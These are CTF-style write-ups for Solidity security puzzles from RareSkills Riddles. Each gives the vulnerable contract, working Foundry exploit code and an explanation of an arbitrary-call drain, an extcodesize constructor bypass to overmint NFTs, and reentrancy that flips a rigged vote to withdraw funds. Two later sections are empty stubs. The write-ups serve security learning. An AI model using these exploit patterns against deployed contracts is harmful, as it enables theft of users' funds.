# CTF Write Ups 2

## RareSkills Solidity Riddles: Forwarder
Link: https://github.com/RareSkills/solidity-riddles/blob/main/contracts/Forwarder.sol

### Contracts
- `src/Week10-11/Forwarder.sol`
```
contract Wallet {
    address public immutable forwarder;

    constructor(address _forwarder) payable {
        require(msg.value == 1 ether);
        forwarder = _forwarder;
    }

    function sendEther(address destination, uint256 amount) public {
        require(msg.sender == forwarder, "sender must be forwarder contract");
        (bool success,) = destination.call{value: amount}("");
        require(success, "failed");
    }
}

contract Forwarder {
    function functionCall(address a, bytes calldata data) public {
        (bool success,) = a.call(data);
        require(success, "forward failed");
    }
}
```
- `test/Week10-11/Forwarder.t.sol`
```
contract ForwarderTest is Test {
    address attackerWallet;
    uint256 attackerWalletBalanceBefore;
    Forwarder forwarderContract;
    Wallet walletContract;

    function setUp() public {
        attackerWallet = address(0xdead);
        forwarderContract = new Forwarder();
        walletContract = (new Wallet){value: 1 ether}(address(forwarderContract));
        attackerWalletBalanceBefore = attackerWallet.balance;
    }

    function testExploit() public {
        bytes memory data = abi.encodeWithSignature("sendEther(address,uint256)", attackerWallet, 1 ether);
        forwarderContract.functionCall(address(walletContract), data);

        _checkSolved();
    }

    function _checkSolved() internal {
        uint256 attackerWalletBalanceAfter = attackerWallet.balance;
        assertApproxEqAbs(
            attackerWalletBalanceAfter - attackerWalletBalanceBefore,
            1 ether,
            1000000000000000 //delta = 0.001
        );
        uint256 walletContractBalance = address(walletContract).balance;
        assertEq(walletContractBalance, 0);
    }
}
```

### Exploit
Cracking this exploit requires knowing how `.call` and `abi.encodeWithSignature` works. But simply, `call` is a low level function used to interact with another contract; and `abi.encodeWithSignature` is used to encode function calls including the function signature and its arguments. The latter returns a bytes array representing an encoded function call that can be used to make a call to another contract's function with the encoded arguments.

Since `sendEther` in `Wallet` can only be called by the `Forwarder`, and `functionCall` in `Forwarder` takes in an arbitrary `data` input which is passed to `call`, we can easily get the `Wallet` contract to send its balance to the attackers wallet by passing in the following as `data``:
```
    bytes memory data = abi.encodeWithSignature("sendEther(address,uint256)", attackerWallet, 1 ether);
    forwarderContract.functionCall(address(walletContract), data);
```
The first line constructs the encoded `sendEther` function call with the attacker's wallet as the destination and 1 ether as the amount to send. When this is passed to `functionCall`, the `Forwarder` contract sends a call to `walletContract` to execute the encoded function call. Thus transfering out the balance to the attacker.

## RareSkills Solidity Riddles: Overmint3
Link: https://github.com/RareSkills/solidity-riddles/blob/main/contracts/Overmint3.sol

### Contracts
- `src/Week10-11/Overmint3.sol`
```
contract Overmint3 is ERC721 {
    using Address for address;

    mapping(address => uint256) public amountMinted;
    uint256 public totalSupply;

    constructor() ERC721("Overmint3", "AT") {}

    function mint() external {
        require(!isContract(msg.sender), "no contracts");
        require(amountMinted[msg.sender] < 1, "only 1 NFT");
        totalSupply++;
        _safeMint(msg.sender, totalSupply);
        amountMinted[msg.sender]++;
    }

    //`isContract()` has been removed from OpenZeppelin's `Address` library in V5
    function isContract(address _addr) public view returns (bool) {
        uint256 size;
        assembly {
            size := extcodesize(_addr)
        }
        return size > 0;
    }
}

contract Exploit {
    Overmint3 public overmint3Contract;
    address public attackerWallet;

    constructor(Overmint3 _overmint3Contract, address _attackerWallet) {
        overmint3Contract = _overmint3Contract;
        attackerWallet = _attackerWallet;
        new ExploitMedium(overmint3Contract, this);
        new ExploitMedium(overmint3Contract, this);
        new ExploitMedium(overmint3Contract, this);
        new ExploitMedium(overmint3Contract, this);
        new ExploitMedium(overmint3Contract, this);
    }

    function retrieve() public payable {
        uint256 balance = overmint3Contract.totalSupply();
        for (uint256 i = 1; i <= balance; i++) {
            overmint3Contract.transferFrom(address(this), attackerWallet, i);
        }
    }
}

contract ExploitMedium {
    Overmint3 public overmint3Contract;
    Exploit public exploitContract;

    constructor(Overmint3 _overmint3Contract, Exploit _exploitContract) {
        overmint3Contract = _overmint3Contract;
        exploitContract = _exploitContract;
        overmint3Contract.mint();
        uint256 tokenId = overmint3Contract.totalSupply();
        overmint3Contract.transferFrom(address(this), address(exploitContract), tokenId);
    }
}
```
- `test/Week10-11/Overmint3.t.sol`
```
contract Overmint3Test is Test {
    Overmint3 overmint3Contract;
    address attackerWallet;
    Exploit exploitContract;

    function setUp() public {
        overmint3Contract = new Overmint3();
        attackerWallet = address(0xbad);
        exploitContract = new Exploit(overmint3Contract, attackerWallet);
    }

    function testExploit() public {
        vm.startPrank(attackerWallet);
        exploitContract.retrieve();
        vm.stopPrank();
        _checkSolved();
    }

    function _checkSolved() internal {
        assertEq(overmint3Contract.balanceOf(attackerWallet), 5);
        assertTrue(vm.getNonce(address(attackerWallet)) <= 1, "must exploit in one transaction");
    }
}
```

### Exploit
The exploit requires understanding that when a function call is made from the constructor of a contract, `extcodesize` of the msg.sender will be `0` since the contract code is only stored at the end of the constructor execution. So this will bypass the `isContract` check in the `mint` function when its called from another contract's constructor.

One might be tempted to use the `onERC721Received` hook in `IERC721Receiver` to try to reenter the mint function to continuously mint NFTs in a single call, but this attack vector will fail. The reason is because if our attack was initiated in the constructor, then there will be no `onERC721Received` hook in the attacking contract available to be called yet since the constructor has not competed its execution. This would only allow 1 NFT to be minted to the attacking contract.

Instead, we could deploy 5 secondary attack contracts that solely exists to call `mint` once in each of their constructors, and then transfer the minted NFT to the primary attacking contract (or to `attackerWallet` for the matter). The primary attacking contract only needs to create 5 instances of the secondary attaking contract in its constructor, and these secondary attacking contracts will then mint and transfer an NFT to the primary contract within their constructor. At the end of the contract deployments, `attackerWallet` just has to call `retrieve` on `Exploit` to transfer out all minted NFTs.

## RareSkills Solidity Riddles: Democracy
Link: https://github.com/RareSkills/solidity-riddles/blob/main/contracts/Democracy.sol

### Contracts
- `src/Week10-11/Democracy.sol` (Note that this is updated slightly: L103 - 126, for compatibility with OpenZeppelin V5)
```
contract Democracy is Ownable, ERC721 {
    uint256 public PRICE = 1_000 ether;
    uint256 public TOTAL_SUPPLY_CAP = 10;

    address public incumbent;
    address public challenger;
    mapping(address => bool) public voted;
    mapping(address => uint256) public votes;
    bool public electionCalled = false;

    modifier electionNotYetCalled() {
        require(!electionCalled, "DemocracyNft: Election has ended");
        _;
    }

    modifier contractBalanceIsGreaterThanZero() {
        require(address(this).balance > 0, "DemocracyNft: Insufficient contract balance");
        _;
    }

    modifier nomineeIsValid(address nominee) {
        require(nominee == incumbent || nominee == challenger, "DemocracyNft: Must vote for incumbent or challenger");
        _;
    }

    modifier hodlerNotYetVoted() {
        require(!voted[msg.sender], "DemocracyNft: One hodler, one vote");
        _;
    }

    modifier callerIsNotAContract() {
        require(tx.origin == msg.sender, "DemocracyNft: Feature available to EOAs only");
        _;
    }

    constructor() payable ERC721("Democracy NFT", "DMRCY") Ownable(msg.sender) {
        incumbent = owner();
    }

    function nominateChallenger(address challenger_) external {
        require(challenger == address(0), "DemocracyNft: Challenger already nominated");

        challenger = challenger_;

        // Rig the election!
        _rigElection();
    }

    function vote(address nominee)
        external
        contractBalanceIsGreaterThanZero
        electionNotYetCalled
        nomineeIsValid(nominee)
        hodlerNotYetVoted
    {
        // Check NFT balance
        uint256 hodlerNftBalance = balanceOf(msg.sender);
        require(hodlerNftBalance > 0, "DemocracyNft: Voting only for NFT hodlers");

        // Log votes
        votes[nominee] += hodlerNftBalance;
        voted[msg.sender] = true;

        // Tip hodler for doing their civic duty
        payable(msg.sender).call{value: address(this).balance / 10}("");

        // Once all hodlers have voted, call election
        if (votes[incumbent] + votes[challenger] >= TOTAL_SUPPLY_CAP) {
            _callElection();
        }
    }

    function mint(address to, uint256 tokenId) external payable callerIsNotAContract onlyOwner {
        require(msg.value >= PRICE, "DemocracyNft: Insufficient transaction value");

        _mint(to, tokenId);
    }

    //Updated slighlty for compatibility with OZ v5
    //----------------------------------------------------
    function approve(address to, uint256 tokenId) public override callerIsNotAContract {
        _approve(to, tokenId, _msgSender());
    }

    // function transferFrom(address from, address to, uint256 tokenId) public override callerIsNotAContract {
    //     require(_isAuthorized(ownerOf(tokenId), _msgSender(), tokenId), "ERC721: caller is not token owner or approved");

    //     _transfer(from, to, tokenId);
    // }

    // function safeTransferFrom(
    //     address from,
    //     address to,
    //     uint256 tokenId,
    //     bytes memory
    // )
    //     public
    //     override
    //     callerIsNotAContract
    // {
    //     require(_isAuthorized(ownerOf(tokenId), _msgSender(), tokenId), "ERC721: caller is not token owner or approved");

    //     _safeTransfer(from, to, tokenId, "");
    // }
    //----------------------------------------------------

    function withdrawToAddress(address address_) external onlyOwner {
        payable(address_).call{value: address(this).balance}("");
    }

    function _callElection() private {
        electionCalled = true;

        if (votes[challenger] > votes[incumbent]) {
            incumbent = challenger;
            _transferOwnership(challenger);

            challenger = address(0);
        }
    }

    function _rigElection() private {
        // Mint voting tokens to challenger
        _mint(challenger, 0);
        _mint(challenger, 1);

        // Make it look like a close election...
        votes[incumbent] = 5;
        votes[challenger] = 3;
    }
}

contract ExploitInitial is IERC721Receiver {
    Democracy democracyContract;
    address challenger;
    ExploitFinal exploitFinalContract;

    constructor(Democracy _democracyContract, address _challenger, ExploitFinal _exploitFinalContract) {
        democracyContract = _democracyContract;
        challenger = _challenger;
        exploitFinalContract = _exploitFinalContract;
    }

    receive() external payable {
        democracyContract.safeTransferFrom(address(this), address(exploitFinalContract), 1);
    }

    function attack() public {
        democracyContract.vote(challenger);
    }

    function onERC721Received(
        address, /*operator*/
        address, /*from*/
        uint256, /*tokenId*/
        bytes calldata /*data*/
    )
        external
        returns (bytes4)
    {
        return IERC721Receiver.onERC721Received.selector;
    }
}

contract ExploitFinal is IERC721Receiver {
    Democracy democracyContract;
    address challenger;

    constructor(Democracy _democracyContract, address _challenger) {
        democracyContract = _democracyContract;
        challenger = _challenger;
    }

    receive() external payable {}

    function onERC721Received(
        address, /*operator*/
        address, /*from*/
        uint256, /*tokenId*/
        bytes calldata /*data*/
    )
        external
        returns (bytes4)
    {
        democracyContract.vote(challenger);
        return IERC721Receiver.onERC721Received.selector;
    }
}
```
- `test/Week10-11/Democracy.t.sol`
```
contract DemocracyTest is Test {
    Democracy democracyContract;
    address owner;
    address attackerWallet;

    ExploitInitial exploitInitialContract;
    ExploitFinal exploitFinalContract;

    function setUp() public {
        democracyContract = new Democracy{value: 1 ether}();
        owner = address(0xdead);
        attackerWallet = address(0xbad);

        exploitFinalContract = new ExploitFinal(democracyContract, attackerWallet);
        exploitInitialContract = new ExploitInitial(democracyContract, attackerWallet, exploitFinalContract);
    }

    function testExploit() public {
        democracyContract.nominateChallenger(attackerWallet);
        assertEq(democracyContract.balanceOf(attackerWallet), 2);

        vm.startPrank(attackerWallet);
        democracyContract.safeTransferFrom(attackerWallet, address(exploitInitialContract), 1);
        democracyContract.vote(attackerWallet);

        exploitInitialContract.attack();
        democracyContract.withdrawToAddress(attackerWallet);
        vm.stopPrank();

        _checkSolved();
    }

    function _checkSolved() internal {
        assertEq(address(democracyContract).balance, 0);
    }
}
```

### Exploit
In the `Democracy` contract, there is no stopping `challenger` from voting for themselves. Realistically, this should be prohibited, and if that's the case, a Factory pattern should be used for the exploit. That is, we should have a Factory contract that can be called to create Attack contracts, and within each Attack contract, it should have some logic for voting once, and then creating another Attack contract and transfering an NFT to that newly created attack contract so that it can also vote, all in a single function call - so this recursive calling workflow should be used in the `receive` function.

In this exploit, it will be taken that `challenger` can vote for themselves.

When `nominateChallenger` is called, two NFT tokens are minted to the challenger. However, since the election is rigged, the votes will be set to `incumbent (I) = 5`, and `challenger (C) = 3`. Note that in the `vote` function, once the total votes sums up to `10`, the elections will be ended, and the winner of the election will be the new owner of the contract, who can then withdraw the balance. For each `vote`, the number of votes is incremented by the NFT balance of `msg.sender`, thus if the challenger calls `vote` right away, the election will end at `5(I), 5(C)`, and the challenger will lose since in order for the challenger to win, they need more votes than the incumbent.

To complete the exploit, the challenger calls `safeTransferFrom` to transfer one NFT to the first attacking contract: `ExploitInitial`. The challenger can then vote for themselves and this will only increase the vote to `5(I), 4(C)` since the challenger is only holding one NFT. 

The challenger calls `attack` from `ExploitInitial`, which in turn calls a `vote` for the challenger. This will increase the vote to `5(I), 5(C)` since `ExploitInitial` has one NFT from the challenger. The vote function in `Democracy` sends some Ether to msg.sender when they cast a vote, and `ExploitInitial` has a `receive` function that will call `safeTransferFrom` to transfer an NFT from `ExploitInitial` to `ExploitFinal`. As `ExploitInitial` receives Ether from `Democracy`, it will then transfer it's NFT to `ExploitFinal`; and in `ExploitFinal`, `onERC721Received` will call another `vote` for challenger, thereby increasing the vote to `5(I), 6(C)`. The execution flow stops, and the election will end since the total votes is more than `10`. Now the challenger will have more votes than the incumbent and they can then withdraw the balance from `Democracy`.


## Damn Vulnerable DeFi (Foundry): Truster
Link: https://github.com/tinchoabbate/damn-vulnerable-defi/tree/v3.0.0/contracts/truster

### Contracts
- `src/Week10-11/TrusterLenderPool.sol`
```
```
- `test/Week10-11/TrusterLenderPool.t.sol`
```
```

### Exploit

## Ethernaut: #13 Gatekeeper 1
Link: https://ethernaut.openzeppelin.com/level/0xb5858B8EDE0030e46C0Ac1aaAedea8Fb71EF423C

### Contracts
- `src/Week10-11/GateKeeperOne.sol`
```
```
- `test/Weel10-11/GateKeeperOne.t.sol`
```
```

### Exploit